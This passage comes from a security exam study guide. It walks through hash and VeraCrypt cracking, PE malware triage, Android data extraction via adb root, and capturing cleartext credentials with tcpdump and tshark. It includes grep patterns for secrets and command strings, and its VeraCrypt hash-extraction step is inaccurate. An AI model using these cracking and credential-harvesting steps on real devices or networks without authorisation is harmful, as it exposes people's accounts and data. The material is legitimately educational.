# Output shows passphrase if found
```

---

### 4.3 VeraCrypt - Encrypted Volume Cracking

**What it does:** Cracks encrypted VeraCrypt volumes using brute force.

#### Mounting VeraCrypt Volume

```bash
# List available disk partitions
lsblk

# Mount encrypted volume
veracrypt --mount /dev/sdb1 /mnt/encrypted --password=PASSWORD

# Or use GUI: Veracrypt → Select Device → Mount
```

#### Brute Forcing VeraCrypt

```bash
# Using hashcat with VeraCrypt hash
# First, extract hash from volume
veracrypt --non-interactive --password=test /dev/sdb1 /mnt/test 2>&1 | grep -i wrong

# Then crack
hashcat -m 13711 -a 0 hash.txt rockyou.txt
```

---

### 4.4 PE File Analysis - Malware Static Analysis

**What is PE (Portable Executable)?**

**PE Format** is the executable file format for Windows binaries (.exe, .dll, .sys).

**File Structure:**

```
┌─────────────────────────────────┐
│  DOS Header (64 bytes)          │  Legacy MS-DOS compatibility
│  PE Signature ("PE\0\0")        │  Marks start of PE format
├─────────────────────────────────┤
│  File Header (20 bytes)         │  Machine type, sections count
│  Optional Header (224-240 bytes)│  Entry point, image size, subsystem
├─────────────────────────────────┤
│  Data Directories (128 bytes)   │  Import, export, resource locations
├─────────────────────────────────┤
│  Sections (.text, .data, .rsrc) │  Code, data, resources
├─────────────────────────────────┤
│  Import Address Table (IAT)     │  DLL functions
│  Export Directory               │  Exported functions
│  Resource Directory             │  Icons, strings, version info
└─────────────────────────────────┘
```

#### Static vs Dynamic Analysis

| Static | Dynamic |
|--------|---------|
| Examine files without running | Run malware in safe environment |
| PE headers, imports, strings | Observe actual behavior |
| DIE, CFF Explorer, objdump | Debugger, monitor, Wireshark |
| Fast, no risk | Time-consuming, requires sandbox |
| Missed runtime behavior | Sees all activity |

#### Detect It Easy (DIE)

**What It Does:**
- Identifies compiler, packer, language
- Detects if file is packed/encrypted
- Shows file properties and version info
- Highlights suspicious packer use
- Useful for quick malware triage

**Installation:**

```bash
# Linux
apt-get install detect-it-easy

# Windows - Download from GitHub
https://github.com/horsicq/Detect-It-Easy
```

**Starting DIE:**

```bash
# GUI mode (Linux/Windows)
DIE

# Command line mode
detect-it-easy filename.exe
```

**UI Layout:**

```
┌────────────────────────────────────────┐
│  Top: File path, Load button           │
├─────────────────┬──────────────────────┤
│ Left Pane:      │ Right Pane:          │
│ Detects:        │ File Info:           │
│ - Compiler      │ - Type: PE 32-bit    │
│ - Packer        │ - Compiler: MSVC     │
│ - Language      │ - Sections, Imports  │
│ - Entropy       │ - Version Info       │
│                 │ - Dependencies       │
└─────────────────┴──────────────────────┘
```

**Reading Results:**

**Left Pane - What It Means:**

```
✓ Compiler: Microsoft Visual C++ 14.0
  → Compiled with MSVC (legitimate)

⚠ Packer: UPX
  → File is packed (unusual for legit software)
  → Could be malware hiding code

! Entropy: 7.2 / 8.0
  → High entropy = encrypted/compressed
  → Normal: 3-5 (readable)
  → Suspicious: 7-8 (likely packed)

✓ Language: C++ / .NET
  → Programming language used
```

**Right Pane - Version Information:**

```
Click "File Info" tab → Properties → Version tab

Internal Name: explorer.exe
Original Filename: EXPLORER.EXE
Product Name: Microsoft Windows
Product Version: 10.0.19045.1
File Version: 10.0.19045.1234
Company Name: Microsoft Corporation
File Description: Windows Explorer
```

#### Challenge 9: Extracting Version Number from PE

**Scenario:** "Find the File Version number from Ghostware.exe"

**Step-by-Step in DIE:**

1. **Open DIE**
   ```
   Launch DIE application
   ```

2. **Load File**
   ```
   File → Open → Select Ghostware.exe
   Click Open
   ```

3. **Wait for Analysis**
   ```
   DIE scans file (5-10 seconds)
   Results appear in left pane (Detects)
   ```

4. **Click "File Info" in Right Pane**
   ```
   Right pane shows:
   - Type: PE 32-bit / 64-bit
   - Compiler info
   - Sections list
   ```

5. **Look for Version Tab**
   ```
   In right pane, find tabs:
   - "Detects"
   - "File Info"
   - "Properties" or similar
   ```

6. **Read Version Information**
   ```
   File Version: 2.3.4.5
   Product Version: 2.3.4.5
   ```

7. **Format Answer**
   ```
   Q: "What is the File Version number?"
   A: 2.3.4.5
   
   Some formats ask for last 2 digits: 45
   Some ask without dots: 2345
   Follow question format
   ```

**Visual Cues in DIE:**

```
Example Output:

DETECTS
├── Compiler: Microsoft Visual C++ 14.0
├── Packer: None detected ✓
├── Language: C++
└── Entropy: 4.2 (normal)

FILE INFO
├── Type: PE executable 32-bit
├── Sections: .text, .data, .rsrc
├── Properties:
│   └── Version: 2.3.4.5
```

#### CFF Explorer (PE Headers Tool)

**What It Does:**
- Shows PE headers in detail
- Edit binary values (hex)
- View import/export tables
- Interactive PE structure viewer
- Windows-only tool

**Installation:**

```
Download from:
https://ntcore.com/exeforum_files/cff_explorer_160.zip

Unzip and run CFF Explorer.exe
```

**Starting CFF Explorer:**

1. **Open Application**
   ```
   Run CFF Explorer.exe
   ```

2. **Load File**
   ```
   File → Open → Ghostware.exe
   ```

3. **UI Overview**
   ```
   ┌─────────────────────────────────┐
   │ Left: PE Structure Tree          │
   │ - DOS Header                    │
   │ - PE Signature                  │
   │ - File Header                   │
   │ - Optional Header               │
   │ - Data Directories              │
   │ - Sections                      │
   │ - Imports                       │
   │ - Exports (if any)              │
   ├─────────────────────────────────┤
   │ Right: Hex values and details   │
   │ - Memory offset                 │
   │ - Raw values                    │
   │ - Interpreted meaning           │
   └─────────────────────────────────┘
   ```

#### PE Header Fields (CFF Explorer)

**File Header Information:**

```
Machine Type: 0x014c = Intel 386 (32-bit)
              0x8664 = x64 (64-bit)
              
Number of Sections: 4 = .text, .data, .rsrc, .reloc

Characteristics: Executable, 32/64-bit, Large address aware
```

**Optional Header:**

```
Image Base: 0x400000 (where loaded in memory)

Entry Point: 0x1234 (first instruction to execute)

Subsystem: 3 = Windows GUI
          2 = Windows CUI (console)
          1 = Native (kernel mode)

Size of Code: 12,288 bytes

Size of Data: 4,096 bytes

Stack Reserve/Commit: Memory allocated for stack
```

**Data Directories:**

```
Export Table: Function export (DLLs only)
Import Table: DLL dependencies
Resource Table: Icons, version strings
Debug Info: Debugging symbols
```

#### Finding Version Information in CFF Explorer

**Path to Version Info:**

```
1. Open CFF Explorer
2. Load file
3. Left tree → Sections
4. Find ".rsrc" section
5. Right pane shows resource entries
6. Look for "3/Version Information"
7. Expand → Find FILEVERSION field
```

**Resource Section (.rsrc) Layout:**

```
Resource Directory
├── Type 3 (Version Info)
├── Type 14 (Group Icon)
├── Type 16 (Version Info)
│   └── Version Info Structure
│       ├── FILEVERSION
│       ├── PRODUCTVERSION
│       ├── CompanyName
│       ├── FileDescription
│       ├── InternalName
│       └── OriginalFilename
```

**Version Number Format:**

```
FILEVERSION: 0x0002 0x0003 0x0004 0x0005
             = 2.3.4.5
             
Each field is 16-bit (0-65535)
Displayed as: Major.Minor.Patch.Build
```

#### Alternative: PE Analysis with Command-Line Tools

**Using strings command (Linux/Mac):**

```bash
# Extract all printable strings from executable
strings Ghostware.exe | grep -i version

# Output might show:
# FileVersion: 2.3.4.5
# ProductVersion: 2.3.4.5
# CompanyName: Unknown
```

**Using objdump (Linux):**

```bash
# Show PE headers
objdump -h Ghostware.exe

# Show imports
objdump -x Ghostware.exe | grep -A 20 "Import"

# Extract resources
objdump -s -j .rsrc Ghostware.exe
```

**Using exiftool (Cross-platform):**

```bash
# Extract file metadata
exiftool Ghostware.exe

# Output shows:
# FileVersion: 2.3.4.5
# ProductVersion: 2.3.4.5
# CompanyName: Unknown
# FileDescription: [description]

# Search for specific field
exiftool Ghostware.exe | grep -i "version"
```

#### PE Analysis Exam Tips

**Common Question Types:**

1. **Version Number Extraction**
   ```
   Q: "Find the File Version number"
   A: Use DIE or CFF Explorer → Version Info
   ```

2. **Compiler Identification**
   ```
   Q: "What compiler was used?"
   A: DIE → Compiler field
   Answer: Microsoft Visual C++, Borland Delphi, etc.
   ```

3. **Packer Detection**
   ```
   Q: "Is the file packed?"
   A: DIE → Packer field
   Answer: Yes - UPX, Yes - Themida, No
   ```

4. **Dependency Analysis**
   ```
   Q: "What DLLs does it import?"
   A: CFF Explorer → Imports section
   Answer: kernel32.dll, user32.dll, advapi32.dll, etc.
   ```

5. **Architecture Detection**
   ```
   Q: "Is it 32-bit or 64-bit?"
   A: DIE → Type field OR CFF → Machine type
   Answer: PE 32-bit or PE 64-bit
   ```

#### PE Analysis Workflow for Malware Triage

**Quick Static Analysis:**

```
1. Run DIE on suspicious file
   ├── Check Packer field
   ├── Check Entropy (normal ~4.2, packed ~7.5)
   ├── Check Company Name (Microsoft, unknown?, suspicious?)
   └── Check Compiler (legitimate vs suspicious)

2. If packed or suspicious packer:
   ├── Likely malware
   ├── Use DIE to identify packer
   ├── Do NOT execute (static analysis only)
   └── Report as suspicious

3. If normal PE properties:
   ├── Check imports for suspicious DLLs
   ├── Run CFF Explorer for detailed headers
   ├── Extract strings for C2 IP addresses
   └── Compare version info with legitimate version

4. Extract strings:
   strings Ghostware.exe | grep -E "(http|ftp|cmd|powershell|exec)"
   ├── Look for C2 URLs
   ├── Look for command patterns
   ├── Look for suspicious file operations
```

---

### Challenge Examples: Domain 4

#### Challenge 8: Hash Cracking

**Question:** Crack the MD5 hash to find the password.

**Answer Format:** AaaAaa*Aaaa

**Solution Steps:**

1. Identify hash type:
```bash
hashid hash_value
```

2. Crack with Hashcat:
```bash
hashcat -m 0 -a 0 hashfile rockyou.txt
```

3. Output shows cracked password

#### Challenge 11: Steganography Extraction

**Question:** Extract hidden data from image file.

**Answer Format:** AaaAaa*Aaaa

**Solution Steps:**

1. Check if image contains hidden data:
```bash
steghide info image.jpg
```

2. Extract data:
```bash
steghide extract -sf image.jpg -p ""
```

3. Read extracted file:
```bash
cat secret.txt
```

---

## Domain 5: Mobile & IoT Security

### Why This Matters

Mobile devices and IoT systems often store sensitive data. Learning to extract and analyze this data is crucial for penetration testing.

---

### 5.1 Android Device Access via ADB

**What is ADB?**
ADB (Android Debug Bridge) is a command-line tool to interact with Android devices for development, testing, and debugging.

**Connection Methods:**
1. **USB Cable:** `adb connect` (physical device)
2. **Wi-Fi (tcpip mode):** `adb tcpip 5555` then `adb connect IP:5555`
3. **Emulator:** Automatic in Android Studio

#### Basic ADB Commands

```bash
# List connected devices
adb devices

# Connect to device via Wi-Fi
adb tcpip 5555
adb connect 192.168.1.100:5555

# Check device connection
adb shell whoami  # Shows current user

# List processes
adb shell ps

# Get system info
adb shell getprop ro.build.version.release  # Android version
adb shell getprop ro.product.model  # Device model
```

---

### 5.2 Advanced ADB Workflows

#### Challenge 4: Android Steganography Deep Dive

**Scenario:** Extract hidden data from Android device photos

**Devices used for hiding steganographic data:**
1. `/sdcard/DCIM/Camera/` - Photo storage location
2. `/sdcard/Pictures/` - Additional picture directory
3. `/sdcard/Downloads/` - Downloaded files

**Full ADB Workflow:**

**Step 1: Connect to Android Device**

```bash
# USB connection (device must have USB debugging enabled)
adb devices
# Output: List of devices

# Or Wi-Fi connection
adb tcpip 5555
adb connect 192.168.1.100:5555
adb devices
```

**Step 2: List Available Photos**

```bash
# List photos in Camera folder
adb shell ls -la /sdcard/DCIM/Camera/

# Output:
# drwxrwxr-x  3 root sdcard_rw     4096 Jun 21 14:32 .
# -rw-rw-rw-  1 root sdcard_rw   524288 Jun 21 14:30 IMG_20240621_143000.jpg
# -rw-rw-rw-  1 root sdcard_rw   786432 Jun 21 14:31 IMG_20240621_143100.jpg
```

**Step 3: Pull Photos to Analysis Computer**

```bash
# Pull single photo
adb pull /sdcard/DCIM/Camera/IMG_20240621_143000.jpg ./

# Pull entire directory
adb pull /sdcard/DCIM/Camera/ ./photos/
```

**Step 4: Analyze with Steghide**

```bash
# Extract steganographic data from image
steghide extract -sf IMG_20240621_143000.jpg

# Output:
# Enter passphrase:  [no passphrase needed for default]
# The file "secret.txt" has been extracted.

# Read extracted data
cat secret.txt
# Output: Contains hidden message or commands
```

**Step 5: Extract Metadata**

```bash
# Use exiftool to check metadata
exiftool IMG_20240621_143000.jpg

# Output:
# Image Width: 4096
# Image Height: 3072
# Camera Model: [device model]
# Date/Time Original: 2024:06:21 14:30:00
# GPS Latitude: [if available]
```

#### Challenge 7: Advanced ADB Workflows

**Objective:** Navigate Android file system, find hidden files, extract data

**Part 1: Installing Applications**

```bash
# Install APK (Android application)
adb install application.apk

# Output:
# Success

# Check installation
adb shell pm list packages | grep application_name

# Reinstall (replace existing)
adb install -r application.apk

# Uninstall
adb uninstall com.example.app
```

**Where APKs are stored:**
```bash
# System apps
ls /system/app/
ls /system/priv-app/

# User apps
ls /data/app/

# Access requires root via adb root
adb root
adb shell ls /data/app/
```

**Part 2: Accessing Protected Directories**

```bash
# Check current user (usually shell user)
adb shell whoami
# Output: shell (not root)

# Try accessing /data/data (requires root)
adb shell ls /data/data/
# Output: Permission denied

# Gain root access
adb root
# Now running as root

adb shell whoami
# Output: root

# Now can access protected directories
adb shell ls /data/data/
```

**Important Directories:**

```bash
/sdcard/
├── DCIM/
│   └── Camera/              # Photos from camera app
├── Pictures/                # Screenshots and images
├── Downloads/               # Downloaded files
├── Documents/               # Documents
└── .hidden/                 # Hidden folder (starts with .)

/data/
├── app/                     # User apps
├── data/
│   └── com.example.app/
│       ├── databases/       # SQLite databases
│       ├── files/           # App private files
│       ├── cache/           # App cache
│       └── shared_prefs/    # App settings
└── system/                  # System data (root only)

/system/
├── app/                     # System apps
└── framework/               # Android framework
```

**Part 3: SQLite Database Extraction**

```bash
# List app databases
adb shell ls /data/data/com.example.app/databases/

# Output:
# app.db
# cache.db

# Pull database
adb pull /data/data/com.example.app/databases/app.db ./

# Analyze on computer
sqlite3 app.db

# SQLite commands:
sqlite> .tables
users notes settings

sqlite> .schema users
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT,
    password TEXT,
    email TEXT
);

sqlite> SELECT * FROM users;
1|admin|secret123|admin@example.com
2|user|pass456|user@example.com

sqlite> .exit
```

**Part 4: Logcat Analysis**

```bash
# Real-time log stream
adb logcat

# Filter for specific app
adb logcat | grep com.example.app

# Save logs to file
adb logcat > logcat_output.log

# Clear logs
adb logcat -c

# Filter by log level (ERROR, WARNING, INFO, DEBUG, VERBOSE)
adb logcat *:E     # Show only errors
adb logcat *:W     # Show warnings and errors
adb logcat *:D     # Show debug and above

# Find sensitive data in logs
adb logcat | grep -iE "(password|token|secret|key|auth)"
```

**Sensitive Data Found in Logs:**
- API tokens and keys
- User passwords (if logged)
- Device tokens
- Database queries
- File paths
- Network requests

**Part 5: Screen Capture and Input**

```bash
# Take screenshot
adb shell screencap /sdcard/screen.png

# Pull screenshot
adb pull /sdcard/screen.png ./

# Type text (simulates keyboard)
adb shell input text "admin"
adb shell input text "password123"

# Tap screen (x, y coordinates)
adb shell input tap 500 1200

# Swipe gesture
adb shell input swipe 100 500 100 100  # Swipe up

# Key press (HOME, BACK, VOLUME_UP, etc)
adb shell input keyevent 3  # HOME
adb shell input keyevent 4  # BACK
```

#### Challenge 4 Walkthrough: Hidden Photo Data

**Given:** Android device with hidden steganographic data in photos

**Question:** "Extract the hidden data from IMG_20240621_143000.jpg"

**Solution:**

1. **Connect Device**
   ```bash
   adb devices
   adb connect 192.168.1.100:5555
   ```

2. **List Photos**
   ```bash
   adb shell ls /sdcard/DCIM/Camera/
   # Find: IMG_20240621_143000.jpg
   ```

3. **Pull Photo**
   ```bash
   adb pull /sdcard/DCIM/Camera/IMG_20240621_143000.jpg ./
   ```

4. **Extract Steganography**
   ```bash
   steghide extract -sf IMG_20240621_143000.jpg
   # Prompted for passphrase (usually none)
   # File extracted: secret.txt or similar
   ```

5. **Read Hidden Data**
   ```bash
   cat secret.txt
   # Output: Hidden message/commands
   ```

6. **Report**
   ```
   Hidden data: "Attacker command execution logs"
   Type: Text file
   Location: /sdcard/DCIM/Camera/IMG_20240621_143000.jpg
   ```

#### Challenge 7 Walkthrough: Accessing Protected Directories

**Given:** Need to find database with login credentials

**Solution:**

1. **Gain Root**
   ```bash
   adb root
   adb shell whoami  # Verify: root
   ```

2. **Find Target App**
   ```bash
   adb shell ls /data/data/ | grep -i app_name
   # Found: com.example.banking
   ```

3. **Extract Database**
   ```bash
   adb shell ls /data/data/com.example.banking/databases/
   # Found: users.db
   
   adb pull /data/data/com.example.banking/databases/users.db ./
   ```

4. **Analyze Database**
   ```bash
   sqlite3 users.db
   .tables
   # Output: users, accounts, transactions
   
   SELECT * FROM users;
   # ID|Username|Password|Email
   # 1|john_doe|MyPassword123|john@example.com
   ```

5. **Report**
   ```
   Credentials found in /data/data/com.example.banking/databases/users.db
   Username: john_doe
   Password: MyPassword123
   ```

#### ADB Exam Tips

| Tool | When to Use |
|------|-------------|
| `adb install` | Need to test app functionality |
| `adb pull /sdcard/` | Extract user files, photos, downloads |
| `adb shell ls` | Navigate file system |
| `adb root` | Access /data/data and protected directories |
| `adb shell screencap` | Document device state |
| `adb logcat` | Find hardcoded credentials or tokens |
| `steghide` | Extract hidden data from images |
| `sqlite3` | Query databases from app data |

---

## Domain 6: Traffic Analysis & Sniffing

### Why This Matters

Network traffic contains everything: passwords, commands, data exfiltration, attacker communications. Analyzing this traffic reveals the full attack picture.

---

### 6.1 Wireshark - Network Packet Analysis

**What it does:** Captures and analyzes network packets to find vulnerabilities, credentials, and attacks.

#### Opening PCAP Files

1. File → Open
2. Select .pcap or .pcapng file
3. Wireshark displays all packets in capture

#### Basic Filters

```
# HTTP traffic
http

# HTTPS traffic
ssl or tls

# Specific IP
ip.src == 192.168.1.5
ip.dst == 10.0.0.1

# Specific port
tcp.port == 80
udp.port == 53

# Protocol
tcp
udp
icmp
arp
```

#### Finding Specific Information in Wireshark

| Filter | Purpose |
|--------|---------|
| `http` | HTTP traffic only |
| `http.request.method == "POST"` | Login attempts |
| `ip.src == 192.168.1.5` | Specific source IP |
| `tcp.port == 3306` | MySQL traffic |
| `data contains "username"` | Username/password fields |
| `ip.dst == 172.22.10.10` | DDoS attack packets |

#### Extracting HTTP Objects

1. Wireshark → File → Export Objects → HTTP
2. Select objects to download
3. Save to disk

#### Finding Login Credentials

Many protocols send passwords in clear text:
- HTTP POST requests
- FTP login attempts
- Telnet sessions
- SMTP commands

1. Capture traffic or open existing PCAP
2. Filter for relevant protocol
3. Right-click packet → Follow → TCP Stream
4. View complete conversation including credentials

---

### 6.2 Tcpdump Command-Line Packet Capture

**What is Tcpdump?**

**Tcpdump** is a command-line tool for capturing network packets. It's the foundation that Wireshark uses on the backend.

**Advantages:**
- Lightweight (no GUI overhead)
- Runs on servers without displays
- Scriptable and automatable
- Powerful filtering with BPF (Berkeley Packet Filter)
- Direct PCAP file generation

**When to Use:**
- Quick packet capture on remote servers
- Automated network monitoring
- Large-scale captures (tcpdump is more efficient)
- Piping to other tools for analysis

#### Installation

```bash
# Linux
sudo apt-get install tcpdump

# macOS
brew install tcpdump

# Requires root privileges
sudo tcpdump
```

#### Basic Capture Syntax

```bash
# Capture on default interface
tcpdump

# Capture on specific interface
tcpdump -i eth0
tcpdump -i wlan0

# List available interfaces
tcpdump -D

# Save to file
tcpdump -i eth0 -w capture.pcap

# Capture specific number of packets
tcpdump -i eth0 -c 100 -w output.pcap
# Stops after 100 packets

# Stop capture (Ctrl+C)
```

#### Common Filters

**Protocol Filters:**

```bash
# TCP traffic only
tcpdump -i eth0 tcp

# UDP traffic only
tcpdump -i eth0 udp

# ICMP (ping)
tcpdump -i eth0 icmp

# ARP (address resolution)
tcpdump -i eth0 arp

# DNS (port 53)
tcpdump -i eth0 port 53

# IPv4 or IPv6
tcpdump -i eth0 ip
tcpdump -i eth0 ip6
```

**Host/IP Filters:**

```bash
# Traffic from specific IP
tcpdump -i eth0 src 192.168.1.5

# Traffic to specific IP
tcpdump -i eth0 dst 10.0.0.0/8

# Traffic between two hosts
tcpdump -i eth0 host 192.168.1.5 and 192.168.1.100

# All traffic except localhost
tcpdump -i eth0 not host 127.0.0.1

# Traffic from specific network
tcpdump -i eth0 net 192.168.0.0/16
```

**Port Filters:**

```bash
# Traffic on specific port
tcpdump -i eth0 port 80

# Traffic from specific port
tcpdump -i eth0 src port 22

# Traffic to specific port
tcpdump -i eth0 dst port 443

# Multiple ports
tcpdump -i eth0 port 80 or port 443
tcpdump -i eth0 "port 22 or port 23"

# Port range
tcpdump -i eth0 portrange 1000-2000
tcpdump -i eth0 tcp portrange 49152-65535
```

#### Complex Filters

**Combining Conditions:**

```bash
# AND operator (implicit or explicit)
tcpdump -i eth0 tcp and dst port 80
tcpdump -i eth0 tcp and (dst port 80 or dst port 443)

# OR operator
tcpdump -i eth0 "port 22 or port 23"

# NOT operator
tcpdump -i eth0 "not (host 192.168.1.5 or host 192.168.1.6)"

# Parentheses for grouping
tcpdump -i eth0 "(tcp or udp) and port 53"
tcpdump -i eth0 "tcp and (dst port 80 or dst port 443)"
```

**Real-World Scenarios:**

```bash
# Capture all HTTP traffic
tcpdump -i eth0 "tcp port 80 or tcp port 8080"

# Capture all HTTPS traffic
tcpdump -i eth0 "tcp port 443 or tcp port 8443"

# Capture DNS queries and responses
tcpdump -i eth0 "port 53"

# Capture FTP traffic (both control and data)
tcpdump -i eth0 "port 21 or port 20"

# Capture SSH traffic
tcpdump -i eth0 "tcp port 22"

# Capture traffic from suspicious host
tcpdump -i eth0 "host 192.168.1.50 and not port 22"

# Capture DDoS traffic (high volume)
tcpdump -i eth0 "src 203.0.113.0/24 and dst 10.0.0.0/8"

# Capture command injection attempts
tcpdump -i eth0 "tcp and (port 80 or port 443)" -A | grep -E "(bash|cmd|exec|sh)"
```

#### Packet Display Options

**Verbosity Levels:**

```bash
# Quiet (default)
tcpdump -i eth0 tcp

# Slightly verbose
tcpdump -v -i eth0 tcp

# Very verbose
tcpdump -vv -i eth0 tcp

# Extra verbose
tcpdump -vvv -i eth0 tcp

# Example output differences:
# -v: Shows flags, window size, options
# -vv: Shows sequence numbers, acknowledgment numbers
# -vvv: Shows complete packet details
```

**Hex and ASCII Output:**

```bash
# Print hex and ASCII (most useful for analysis)
tcpdump -i eth0 -X "tcp port 80"
# Output shows:
# 0x0000:  4500 003c 5d0e 4000 4006 7f58 c0a8 0132  E..<]...@..X...2
# 0x0010:  0a00 0001 04d2 0050 d123 4567 89ab cdef  .......P.#Eg....

# Print ASCII only
tcpdump -i eth0 -A "tcp port 21"
# Output shows readable text (passwords!)

# Numbers instead of names
tcpdump -i eth0 -n tcp
# Output: IP addresses not resolved to hostnames
```

**Output Timing Options:**

```bash
# Print timestamp
tcpdump -i eth0 -tttt tcp
# Output: 2024-06-21 14:30:15.123456

# Relative timestamp (time since first packet)
tcpdump -i eth0 -ttt tcp

# No timestamp
tcpdump -i eth0 -t tcp
```

#### Capturing Credentials (Exam Scenario)

**Capturing FTP Login:**

```bash
# Capture FTP traffic with ASCII
tcpdump -i eth0 -A "tcp port 21" -w ftp.pcap

# Later, view captured credentials
tcpdump -r ftp.pcap -A | grep -E "(USER|PASS|user|pass)"

# Output might show:
# USER admin
# PASS secret123
```

**Capturing HTTP Credentials:**

```bash
# Capture HTTP traffic
tcpdump -i eth0 -A "tcp port 80" | tee http.txt

# Search for Authorization headers
grep -i "authorization\|basic\|password" http.txt

# Output:
# Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
# Decode: echo YWRtaW46cGFzc3dvcmQxMjM= | base64 -d
# Result: admin:password123
```

**Capturing DNS Queries:**

```bash
# Capture DNS traffic
tcpdump -i eth0 -A "port 53"

# Identifies suspicious domains
# Shows: example.com, malware-c2.com, evil-domain.net
```

#### Saving and Reading PCAP Files

**Saving Capture:**

```bash
# Save to file
tcpdump -i eth0 -w capture.pcap

# Continuously rotate files (Linux)
tcpdump -i eth0 -w capture-%Y%m%d-%H%M%S.pcap -G 3600
# Creates new file every hour

# Reading back
tcpdump -r capture.pcap

# Read and apply filter
tcpdump -r capture.pcap "tcp port 80"

# Read with packet details
tcpdump -r capture.pcap -vv

# Export to specific format
tcpdump -r capture.pcap -w capture-filtered.pcap "tcp and port 443"
```

#### Exam Tips for Tcpdump

**Capture DDoS Attack:**

```bash
# Find source IPs flooding victim
tcpdump -i eth0 "dst 10.0.0.5" -vv | head -50

# Identifies pattern:
# 203.0.113.1 → 10.0.0.5
# 203.0.113.2 → 10.0.0.5
# 203.0.113.3 → 10.0.0.5
# Answer: Botnet from 203.0.113.0/24
```

**Detect Data Exfiltration:**

```bash
# Find large uploads from internal IP
tcpdump -i eth0 "src 192.168.1.50 and dst not 192.168.0.0/16" -vv

# Shows: suspicious host sending large amounts of data
```

**Identify C2 Communication:**

```bash
# Find persistent connections to external IPs
tcpdump -i eth0 "dst not 192.168.0.0/16 and not 10.0.0.0/8" -A

# Identifies: Reverse shell connecting to attacker
```

---

### 6.3 Tshark CLI Wireshark Analysis

**What is Tshark?**

**Tshark** is the command-line version of Wireshark. It uses the same dissectors and filters but without GUI overhead.

**Advantages:**
- Same filtering as Wireshark GUI
- Better for scripting and automation
- Can process large PCAP files
- Flexible output formats (JSON, CSV, plain text)
- Ideal for batch processing

**Installation:**

```bash
# Linux
sudo apt-get install tshark

# macOS
brew install wireshark

# Windows (Wireshark includes tshark.exe)
choco install wireshark
```

#### Basic Tshark Usage

**Reading PCAP Files:**

```bash
# Simple read
tshark -r capture.pcapng

# Output: Lists all packets with summary info

# Count packets
tshark -r capture.pcapng | wc -l

# Show specific packet number
tshark -r capture.pcapng -Y "frame.number == 42"

# Show packet details (verbose)
tshark -r capture.pcapng -V
```

#### Tshark Filters

**Display Filters (same as Wireshark GUI):**

```bash
# HTTP traffic
tshark -r capture.pcapng -Y "http.request"

# HTTPS traffic
tshark -r capture.pcapng -Y "ssl.handshake"

# DNS traffic
tshark -r capture.pcapng -Y "dns.qry.name"

# FTP traffic
tshark -r capture.pcapng -Y "ftp or ftp-data"

# Telnet
tshark -r capture.pcapng -Y "telnet"

# Specific IP
tshark -r capture.pcapng -Y "ip.src == 192.168.1.5"

# TCP with specific port
tshark -r capture.pcapng -Y "tcp.port == 443"

# Multiple conditions
tshark -r capture.pcapng -Y "http and ip.src == 192.168.1.5"
```

#### Output Formatting

**Different Output Formats:**

```bash
# Default (text summary)
tshark -r capture.pcapng

# Verbose (details for each packet)
tshark -r capture.pcapng -V

# Very verbose
tshark -r capture.pcapng -Vv

# JSON format
tshark -r capture.pcapng -T json > output.json

# CSV format
tshark -r capture.pcapng -T csv > output.csv

# Tab-separated values
tshark -r capture.pcapng -T psml > output.psml
```

#### Extracting Specific Fields

**Using -T fields with -e:**

```bash
# Extract IP addresses
tshark -r capture.pcapng -T fields -e ip.src -e ip.dst

# Output:
# 192.168.1.5      10.0.0.1
# 192.168.1.5      10.0.0.2
# 192.168.1.50     203.0.113.10

# Extract HTTP URLs
tshark -r capture.pcapng -Y "http.request" -T fields -e http.host -e http.request.uri

# Output:
# example.com      /api/users
# malware-c2.com   /cmd?id=1234

# Extract DNS queries
tshark -r capture.pcapng -Y "dns.qry.name" -T fields -e dns.qry.name -e dns.resp.type

# Extract TCP ports
tshark -r capture.pcapng -T fields -e tcp.srcport -e tcp.dstport
```

#### Protocol-Specific Analysis

**HTTP/HTTPS:**

```bash
# All HTTP requests
tshark -r capture.pcapng -Y "http.request" -T fields -e http.method -e http.host -e http.request.uri

# HTTP 404 errors
tshark -r capture.pcapng -Y "http.response.code == 404" -T fields -e http.host -e http.response.code

# HTTPS certificates
tshark -r capture.pcapng -Y "ssl.handshake.certificate" -T fields -e x509sat.commonName
```

**FTP:**

```bash
# FTP login attempts
tshark -r capture.pcapng -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg

# Output shows: USER admin, PASS password123

# FTP data transfers
tshark -r capture.pcapng -Y "ftp-data" -T fields -e ftp-data
```

**DNS:**

```bash
# DNS queries (domains being resolved)
tshark -r capture.pcapng -Y "dns.qry.name" -T fields -e dns.qry.name

# Output: example.com, malware.com, c2-server.net

# DNS response codes (0=success, 3=NXDOMAIN)
tshark -r capture.pcapng -Y "dns.resp" -T fields -e dns.resp.code
```

**MQTT:**

```bash
# MQTT PUBLISH messages with topics
tshark -r capture.pcapng -Y "mqtt.msgtype == 3" -T fields -e mqtt.topic -e mqtt.msg

# Output:
# home/temperature       23.5
# home/humidity          45.2

# MQTT CONNECT messages
tshark -r capture.pcapng -Y "mqtt.msgtype == 1" -T fields -e mqtt.clientid
```

#### Statistics and Summaries

**Traffic Statistics:**

```bash
# Summary by protocol
tshark -r capture.pcapng -q -z io,phs

# Summary by IP
tshark -r capture.pcapng -q -z ip_hosts,tree

# Connection statistics
tshark -r capture.pcapng -q -z endpoints,tcp

# Traffic rate
tshark -r capture.pcapng -q -z io,stat,1
```

#### Packet Inspection

**Detailed Packet Analysis:**

```bash
# Show specific packet with all details
tshark -r capture.pcapng -V -Y "frame.number == 100"

# Show hex dump
tshark -r capture.pcapng -x

# Show hex and ASCII
tshark -r capture.pcapng -xx

# Show ASCII only
tshark -r capture.pcapng -O text
```

#### Real-Time Capture with Tshark

**Live Packet Capture:**

```bash
# Capture on interface (like tcpdump)
tshark -i eth0

# Save while capturing
tshark -i eth0 -w live_capture.pcapng

# Apply filter while capturing
tshark -i eth0 -Y "tcp port 80"

# Stop with Ctrl+C
```

#### Exam Use Cases

**Finding DDoS Sources:**

```bash
# Identify IPs sending excessive traffic to victim
tshark -r ddos_capture.pcapng -Y "ip.dst == 10.0.0.5" -T fields -e ip.src | sort | uniq -c | sort -rn

# Output:
# 1500 203.0.113.1
# 1450 203.0.113.2
# 1400 203.0.113.3
```

**Extracting Credentials:**

```bash
# FTP credentials
tshark -r capture.pcapng -Y "ftp.request.command == 'USER' or ftp.request.command == 'PASS'" -T fields -e ftp.request.command -e ftp.request.arg

# Telnet (less useful due to control characters)
tshark -r capture.pcapng -Y "telnet" -T fields -e tcp.payload

# HTTP Basic Auth (base64 decode required)
